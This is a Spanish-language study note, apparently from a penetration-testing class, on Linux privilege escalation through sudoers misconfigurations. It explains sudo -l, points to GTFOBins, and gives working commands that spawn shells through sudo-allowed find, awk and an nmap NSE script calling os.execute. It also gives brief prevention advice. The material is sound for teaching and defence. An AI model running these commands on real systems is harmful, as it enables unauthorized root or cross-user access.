# Abusando de privilegios a nivel de Sudoers

Tags: #Linux #Sudoers #Escalada #Root #Privilegios 

El archivo **/etc/sudoers** es un archivo de configuración en sistemas Linux que se utiliza para controlar el acceso de los usuarios a las diferentes acciones que pueden realizar en el sistema. Este archivo contiene una lista de usuarios y grupos de usuarios que tienen permisos para realizar tareas de administración en el sistema.

El comando “**sudo**” permite a los usuarios ejecutar comandos como superusuario o como otro usuario con privilegios especiales. El archivo sudoers especifica qué usuarios pueden ejecutar qué comandos con sudo y con qué privilegios.

Abusar de los privilegios a nivel de sudoers es una técnica utilizada por los atacantes para elevar su nivel de acceso en un sistema comprometido. Si un atacante es capaz de obtener acceso a una cuenta con permisos de sudo en el archivo sudoers, puede ejecutar comandos con privilegios especiales y realizar acciones maliciosas en el sistema.

El comando “**sudo -l**” es utilizado para listar los permisos de sudo de un usuario en particular. Al ejecutar este comando, se muestra una lista de los comandos que el usuario tiene permiso para ejecutar y bajo qué condiciones.

Para prevenir el abuso de privilegios a nivel de sudoers, se recomienda mantener los permisos adecuados en el archivo sudoers y limitar el número de usuarios con permisos de sudo. Además, es importante monitorear regularmente el archivo sudoers y buscar cambios inesperados o sospechosos en su contenido.

A continuación, se os comparte el recurso GTFOBINS el cual utilizamos en esta clase para detectar comandos que potencialmente puedan ser explotados para elevar nuestro privilegio de usuario:

- **GTFOBins**: [https://gtfobins.github.io/](https://gtfobins.github.io/)


## Sudoers 

En la pagina de GTFOBins buscamos el comando y la pestaña de **SUDO**
* Directorios  Linux con capacidad de escritura
	* **/tmp/**
	* **/dev/shm/**

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoer y poder ejecutar como root algun comando
	
	# (ALL : ALL) ALL
	# ALL=(root) NOPASSWD: /usr/bin/find
	
	# El comando que podemos ejecutar lo debemos de hacer asi:
❯ sudo find . -exec /bin/sh \; -quit
❯ sudo awk 'BEGIN {system("/bin/sh")}' 
```

También puede que nos salga en el Sudoers la siguiente información.

```bash
❯ sudo -l                                                    # Si encontramos esto, es que podemos ejecutar como nuestro usuario el comando 'nmap' siendo 'villa' sin passwd
	
	#  (villa) NOPASSWD: /usr/bin/nmap 

	# El comando que podemos ejecutar lo debemos de hacer asi:
❯ echo 'os.execute("/bin/sh")' > script.nse                  # Este comando lo podemos ejecutar en un dir con capacidad de escritura, el .nse es porque es un script en LUA y ese tipo de archivos los lee nmap
❯ sudo -u villa nmap --script=/tmp/script.nse
```